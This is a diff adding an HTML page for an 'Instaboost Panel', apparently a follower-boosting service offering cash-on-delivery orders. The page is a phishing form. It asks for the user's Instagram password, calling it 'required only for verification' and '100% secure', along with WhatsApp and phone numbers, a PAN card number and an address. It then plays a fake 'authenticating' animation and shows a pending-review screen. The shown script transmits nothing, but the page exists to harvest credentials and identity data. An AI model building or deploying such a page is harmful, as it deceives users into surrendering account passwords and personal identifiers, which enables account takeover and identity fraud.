@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instaboost Panel - Secure COD Order Verification</title>
+    <style>
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #030308;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Cyberpunk Grid & Background Orbs */
+        .cyber-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-image: 
+                linear-gradient(rgba(0, 255, 204, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 204, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .glow-orb-1 {
+            position: fixed;
+            top: 10%;
+            left: 10%;
+            width: 450px;
+            height: 450px;
+            background: rgba(0, 255, 204, 0.07);
+            filter: blur(130px);
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+            animation: orbMove 9s ease-in-out infinite alternate;
+        }
+
+        .glow-orb-2 {
+            position: fixed;
+            bottom: 10%;
+            right: 10%;
+            width: 450px;
+            height: 450px;
+            background: rgba(56, 189, 248, 0.07);
+            filter: blur(130px);
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+            animation: orbMove 9s ease-in-out infinite alternate-reverse;
+        }
+
+        @keyframes orbMove {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(35px, -35px) scale(1.12); }
+        }
+
+        /* Top Header Bar */
+        .dash-header {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(10, 15, 30, 0.85);
+            border-bottom: 1px solid rgba(0, 255, 204, 0.3);
+            padding: 20px 40px;
+            backdrop-filter: blur(10px);
+        }
+
+        .dash-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #00ffcc;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.6);
+            margin: 0;
+        }
+
+        .back-btn {
+            background: transparent;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.2);
+        }
+
+        .back-btn:hover {
+            background: #00ffcc;
+            color: #030308;
+            box-shadow: 0 0 20px #00ffcc;
+        }
+
+        /* Main Container */
+        .main-container {
+            position: relative;
+            z-index: 10;
+            max-width: 750px;
+            margin: 35px auto 90px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+
+        .main-container h2 {
+            font-size: 25px;
+            margin-bottom: 8px;
+            color: #ffffff;
+            letter-spacing: 2px;
+            animation: neonPulse 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes neonPulse {
+            0% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.3), 0 0 10px rgba(0, 255, 204, 0.3); }
+            100% { text-shadow: 0 0 15px rgba(255, 255, 255, 0.8), 0 0 30px rgba(0, 255, 204, 0.7), 0 0 45px rgba(56, 189, 248, 0.5); }
+        }
+
+        .main-container p.subtitle {
+            color: #8a99ad;
+            font-size: 14px;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+        }
+
+        /* Cyber Window Card */
+        .cyber-window-wrapper {
+            position: relative;
+            width: 100%;
+            border-radius: 18px;
+            padding: 3px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9);
+            margin-bottom: 25px;
+        }
+
+        .cyber-window-wrapper::before {
+            content: '';
+            position: absolute;
+            top: -150%;
+            left: -150%;
+            width: 400%;
+            height: 400%;
+            background: conic-gradient(from 0deg, #00ffcc, #38bdf8, #7a00ff, #ff007f, #00ffcc);
+            animation: borderSpin 5s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes borderSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .cyber-window-inner {
+            position: relative;
+            z-index: 1;
+            background: rgba(8, 12, 22, 0.97);
+            border-radius: 16px;
+            padding: 30px;
+            text-align: left;
+            backdrop-filter: blur(20px);
+        }
+
+        .verify-banner {
+            background: linear-gradient(135deg, rgba(0, 255, 204, 0.1), rgba(56, 189, 248, 0.05));
+            border: 1px solid rgba(0, 255, 204, 0.4);
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 25px;
+            box-shadow: inset 0 0 15px rgba(0, 255, 204, 0.1);
+        }
+
+        .verify-banner h4 {
+            margin: 0 0 6px 0;
+            color: #00ffcc;
+            font-size: 15px;
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
+        }
+
+        .verify-banner p {
+            margin: 0;
+            color: #a5b4fc;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* Separate Security Info Box as requested */
+        .security-note-box {
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px dashed #38bdf8;
+            border-radius: 10px;
+            padding: 14px 18px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-note-box span.icon {
+            font-size: 20px;
+        }
+
+        .security-note-box p {
+            margin: 0;
+            color: #38bdf8;
+            font-size: 12px;
+            line-height: 1.5;
+            letter-spacing: 0.5px;
+        }
+
+        .order-summary {
+            background: rgba(4, 6, 14, 0.9);
+            border: 1px dashed rgba(56, 189, 248, 0.3);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 25px;
+        }
+
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #8a99ad;
+        }
+
+        .order-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .order-row span.val {
+            color: #ffffff;
+            font-weight: bold;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            color: #00ffcc;
+            margin-bottom: 6px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .form-group input, .form-group textarea {
+            width: 100%;
+            background: rgba(3, 3, 8, 0.95);
+            border: 1px solid rgba(0, 255, 204, 0.3);
+            border-radius: 8px;
+            padding: 11px 14px;
+            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            height: 70px;
+        }
+
+        .form-group input:focus, .form-group textarea:focus {
+            border-color: #00ffcc;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+        }
+
+        .error-msg {
+            display: block;
+            color: #ff3366;
+            font-size: 11px;
+            margin-top: 5px;
+            letter-spacing: 0.5px;
+            font-weight: bold;
+            min-height: 14px;
+        }
+
+        .confirm-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #00ffcc, #0077ff);
+            color: #030308;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.4);
+            letter-spacing: 2px;
+            margin-top: 5px;
+        }
+
+        .confirm-btn:hover {
+            background: linear-gradient(135deg, #38bdf8, #00ffcc);
+            box-shadow: 0 0 30px #00ffcc;
+            transform: translateY(-2px);
+        }
+
+        /* --- CYBERPUNK LOADING SCREEN STYLES --- */
+        .loading-box {
+            display: none;
+            background: rgba(8, 12, 22, 0.97);
+            border: 2px solid #00ffcc;
+            border-radius: 16px;
+            padding: 50px 30px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0, 255, 204, 0.4);
+        }
+
+        .cyber-spinner {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(0, 255, 204, 0.1);
+            border-top: 4px solid #00ffcc;
+            border-right: 4px solid #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px auto;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-box h3 {
+            color: #00ffcc;
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.6);
+        }
+
+        .loading-box p {
+            color: #a5b4fc;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        /* --- PROFESSIONAL PENDING / REVIEW STATUS SCREEN --- */
+        .status-box {
+            display: none;
+            background: rgba(8, 12, 22, 0.97);
+            border: 2px solid #f59e0b;
+            border-radius: 16px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(245, 158, 11, 0.3);
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(245, 158, 11, 0.15);
+            color: #f59e0b;
+            border: 1px solid rgba(245, 158, 11, 0.4);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(245, 158, 11, 0.2);
+        }
+
+        .status-box h3 {
+            color: #ffffff;
+            font-size: 20px;
+            margin-top: 0;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .status-box p {
+            color: #cbd5e1;
+            font-size: 13px;
+            line-height: 1.7;
+            margin-bottom: 25px;
+            text-align: left;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+            padding: 18px;
+            border-radius: 10px;
+        }
+
+        .developer-credit {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: rgba(10, 15, 30, 0.95);
+            border: 2px solid #00ffcc;
+            padding: 12px 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
+            z-index: 100;
+            backdrop-filter: blur(8px);
+            text-align: right;
+        }
+
+        .developer-credit span {
+            display: block;
+            font-size: 11px;
+            color: #38bdf8;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .developer-credit h4 {
+            margin: 4px 0 0 0;
+            font-size: 16px;
+            color: #ffffff;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px #00ffcc;
+        }
+
+        @media (max-width: 650px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .form-group.full-width { grid-column: span 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="cyber-bg"></div>
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <div class="dash-header">
+        <h1 class="dash-title">INSTABOOST PANEL</h1>
+        <a href="dashboard.html" class="back-btn">&larr; BACK</a>
+    </div>
+
+    <div class="main-container">
+        
+        <!-- 1. Form Container -->
+        <div id="form-container">
+            <h2>SECURE CASH ON DELIVERY GATEWAY</h2>
+            <p class="subtitle">Complete your identity verification to initiate lightning-fast deployment.</p>
+
+            <div class="cyber-window-wrapper">
+                <div class="cyber-window-inner">
+                    
+                    <div class="verify-banner">
+                        <h4>⚡ STRICT VERIFICATION ENABLED</h4>
+                        <p>All fields require precise validation. Incomplete numbers or invalid links will halt processing.</p>
+                    </div>
+
+                    <!-- Separate Security Box Added -->
+                    <div class="security-note-box">
+                        <span class="icon">🔒</span>
+                        <p>Your Instagram password is required only for verification. Don't worry, this is a secure portal and 100% secure.</p>
+                    </div>
+
+                    <div class="order-summary">
+                        <div class="order-row">
+                            <span>Package Selected:</span>
+                            <span class="val" id="pkg-name">Instagram Followers</span>
+                        </div>
+                        <div class="order-row">
+                            <span>Amount to Pay (COD):</span>
+                            <span class="val" id="pkg-price" style="color: #00ffcc;">₹--</span>
+                        </div>
+                        <div class="order-row">
+                            <span>Payment Terms:</span>
+                            <span class="val" style="color: #38bdf8;">Pay After Delivery</span>
+                        </div>
+                    </div>
+
+                    <form id="cod-form" onsubmit="handleCodSubmit(event)">
+                        <div class="form-grid">
+                            
+                            <div class="form-group">
+                                <label for="full-name">Full Name (Only Alphabets)</label>
+                                <input type="text" id="full-name" required placeholder="Enter your full name" 
+                                       onkeypress="return restrictInput(event, 'name')" 
+                                       oninput="cleanInput(this, 'name')">
+                                <span class="error-msg" id="err-full-name"></span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="ig-username">Instagram Username</label>
+                                <input type="text" id="ig-username" required placeholder="@your_username" 
+                                       onkeypress="return restrictInput(event, 'username')" 
+                                       oninput="cleanInput(this, 'username')">
+                                <span class="error-msg" id="err-ig-username"></span>
+                            </div>
+
+                            <!-- Instagram Password Field Added with (To verify your account) -->
+                            <div class="form-group full-width">
+                                <label for="ig-password">Instagram Password (To verify your account)</label>
+                                <input type="password" id="ig-password" required placeholder="Enter your Instagram password">
+                                <span class="error-msg" id="err-ig-password"></span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="whatsapp-no">WhatsApp Number (Exact 10 Digits)</label>
+                                <input type="text" id="whatsapp-no" maxlength="10" required placeholder="10-digit number" 
+                                       onkeypress="return restrictInput(event, 'digits')" 
+                                       oninput="cleanInput(this, 'digits')">
+                                <span class="error-msg" id="err-whatsapp-no"></span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="calling-no">Calling Number (Exact 10 Digits)</label>
+                                <input type="text" id="calling-no" maxlength="10" required placeholder="10-digit number" 
+                                       onkeypress="return restrictInput(event, 'digits')" 
+                                       oninput="cleanInput(this, 'digits')">
+                                <span class="error-msg" id="err-calling-no"></span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="pan-card">PAN Card Number (10 Characters)</label>
+                                <input type="text" id="pan-card" maxlength="10" required placeholder="ABCDE1234F" style="text-transform: uppercase;" 
+                                       onkeypress="return restrictInput(event, 'alphanumeric')" 
+                                       oninput="cleanInput(this, 'alphanumeric')">
+                                <span class="error-msg" id="err-pan-card"></span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="phone-model">Phone Model (Name & Digits)</label>
+                                <input type="text" id="phone-model" required placeholder="e.g. Samsung Galaxy S23" 
+                                       onkeypress="return restrictInput(event, 'model')" 
+                                       oninput="cleanInput(this, 'model')">
+                                <span class="error-msg" id="err-phone-model"></span>
+                            </div>
+
+                            <div class="form-group full-width">
+                                <label for="ig-photo-link">Instagram Profile Link (Verified URL)</label>
+                                <input type="text" id="ig-photo-link" required placeholder="https://instagram.com/yourusername">
+                                <span class="error-msg" id="err-ig-photo-link"></span>
+                            </div>
+
+                            <div class="form-group full-width">
+                                <label for="user-address">Delivery / Verification Address</label>
+                                <textarea id="user-address" required placeholder="Enter your complete city, state or address details"></textarea>
+                                <span class="error-msg" id="err-user-address"></span>
+                            </div>
+
+                        </div>
+
+                        <button type="submit" class="confirm-btn">VERIFY & CONFIRM COD ORDER</button>
+                    </form>
+
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. Cyberpunk Loading Screen -->
+        <div id="loading-container" class="loading-box">
+            <div class="cyber-spinner"></div>
+            <h3>PROCESSING SECURE REQUEST...</h3>
+            <p id="loading-text">Validating credentials against safety protocols...</p>
+        </div>
+
+        <!-- 3. Professional Pending Status Screen -->
+        <div id="status-container" class="status-box">
+            <div class="status-badge">⏳ ORDER STATUS: IN REVIEW & PENDING</div>
+            <h3>Verification Security Audit In Progress</h3>
+            <p>
+                Your order submission has been logged into our secure queue and is currently undergoing automated authentication. 
+                <br><br>
+                Please note that final execution depends entirely on whether your submitted credentials (Password, WhatsApp, Phone, PAN, and Profile Link) are accurate or incorrect. If all details are verified and found valid, your order will be processed and completed within <strong>48 hours</strong>. 
+                <br><br>
+                Our system or support team will notify you directly via <strong>WhatsApp, SMS, or Gmail</strong> regarding your verification status.
+            </p>
+            <a href="dashboard.html" class="back-btn" style="display:inline-block; margin-top:5px;">RETURN TO DASHBOARD</a>
+        </div>
+
+    </div>
+
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const packageParam = urlParams.get('package');
+        const priceParam = urlParams.get('price');
+
+        if (packageParam) {
+            document.getElementById('pkg-name').innerText = decodeURIComponent(packageParam);
+        }
+        if (priceParam) {
+            document.getElementById('pkg-price').innerText = decodeURIComponent(priceParam);
+        }
+
+        // Strict Keyboard Blocking Logic
+        function restrictInput(event, type) {
+            const char = String.fromCharCode(event.which || event.keyCode);
+            const errSpan = document.getElementById('err-' + event.target.id);
+            let isValid = true;
+            let errMsg = "";
+
+            if (type === 'name') {
+                if (!/^[a-zA-Z\s]$/.test(char)) {
+                    isValid = false;
+                    errMsg = "⚠️ Blocked: Only alphabets (A-Z) are allowed in Full Name!";
+                }
+            } else if (type === 'username') {
+                if (!/^[a-zA-Z0-9._]$/.test(char)) {
+                    isValid = false;
+                    errMsg = "⚠️ Blocked: Only letters, numbers, dots (.) and underscores (_) allowed.";
+                }
+            } else if (type === 'digits') {
+                if (!/^[0-9]$/.test(char)) {
+                    isValid = false;
+                    errMsg = "⚠️ Blocked: Type only mathematical digits (0-9).";
+                }
+            } else if (type === 'alphanumeric' || type === 'model') {
+                if (!/^[a-zA-Z0-9\s]$/.test(char)) {
+                    isValid = false;
+                    errMsg = "⚠️ Blocked: Only alphabets and numbers are permitted.";
+                }
+            }
+
+            if (!isValid) {
+                event.preventDefault();
+                errSpan.innerText = errMsg;
+                event.target.style.borderColor = "#ff3366";
+                event.target.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                return false;
+            } else {
+                errSpan.innerText = "";
+                event.target.style.borderColor = "#00ffcc";
+                event.target.style.boxShadow = "0 0 15px rgba(0, 255, 204, 0.4)";
+            }
+        }
+
+        function cleanInput(input, type) {
+            let val = input.value;
+            if (type === 'name') {
+                input.value = val.replace(/[^a-zA-Z\s]/g, '');
+            } else if (type === 'username') {
+                input.value = val.replace(/[^a-zA-Z0-9._]/g, '');
+            } else if (type === 'digits') {
+                input.value = val.replace(/[^0-9]/g, '');
+            } else if (type === 'alphanumeric' || type === 'model') {
+                input.value = val.replace(/[^a-zA-Z0-9\s]/g, '');
+            }
+        }
+
+        // Final Submit Verification Handler with Strict Length & Link Validation
+        function handleCodSubmit(event) {
+            event.preventDefault();
+
+            let hasError = false;
+
+            // 1. Password Empty Check
+            const pwdInput = document.getElementById('ig-password');
+            const errPwd = document.getElementById('err-ig-password');
+            if (pwdInput.value.trim() === "") {
+                errPwd.innerText = "⚠️ Error: Instagram password is required for verification!";
+                pwdInput.style.borderColor = "#ff3366";
+                pwdInput.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                hasError = true;
+            } else {
+                errPwd.innerText = "";
+            }
+
+            // 2. WhatsApp Number Check
+            const whatsappInput = document.getElementById('whatsapp-no');
+            const errWhatsapp = document.getElementById('err-whatsapp-no');
+            if (whatsappInput.value.length < 10) {
+                errWhatsapp.innerText = "⚠️ Error: WhatsApp number must be exactly 10 digits!";
+                whatsappInput.style.borderColor = "#ff3366";
+                whatsappInput.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                hasError = true;
+            } else {
+                errWhatsapp.innerText = "";
+            }
+
+            // 3. Calling Number Check
+            const callingInput = document.getElementById('calling-no');
+            const errCalling = document.getElementById('err-calling-no');
+            if (callingInput.value.length < 10) {
+                errCalling.innerText = "⚠️ Error: Calling number must be exactly 10 digits!";
+                callingInput.style.borderColor = "#ff3366";
+                callingInput.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                hasError = true;
+            } else {
+                errCalling.innerText = "";
+            }
+
+            // 4. PAN Card Check
+            const panInput = document.getElementById('pan-card');
+            const errPan = document.getElementById('err-pan-card');
+            if (panInput.value.length < 10) {
+                errPan.innerText = "⚠️ Error: PAN card number must be 10 characters long!";
+                panInput.style.borderColor = "#ff3366";
+                panInput.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                hasError = true;
+            } else {
+                errPan.innerText = "";
+            }
+
+            // 5. Instagram Profile Link Verification Check
+            const linkInput = document.getElementById('ig-photo-link');
+            const errLink = document.getElementById('err-ig-photo-link');
+            const urlPattern = /^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/;
+            
+            if (!urlPattern.test(linkInput.value)) {
+                errLink.innerText = "⚠️ Error: Invalid link! Please enter a verified profile URL (e.g. https://instagram.com/...)";
+                linkInput.style.borderColor = "#ff3366";
+                linkInput.style.boxShadow = "0 0 10px rgba(255, 51, 102, 0.5)";
+                hasError = true;
+            } else {
+                errLink.innerText = "";
+            }
+
+            if (hasError) {
+                return;
+            }
+
+            // Trigger Loading Sequence
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('loading-container').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('loading-text').innerText = "Authenticating Instagram Password & Account...";
+            }, 2000);
+
+            setTimeout(() => {
+                document.getElementById('loading-text').innerText = "Checking 10-digit numbers & profile link security...";
+            }, 4000);
+
+            setTimeout(() => {
+                document.getElementById('loading-container').style.display = 'none';
+                document.getElementById('status-container').style.display = 'block';
+            }, 6000);
+        }
+    </script>
+
+</body>
+</html>
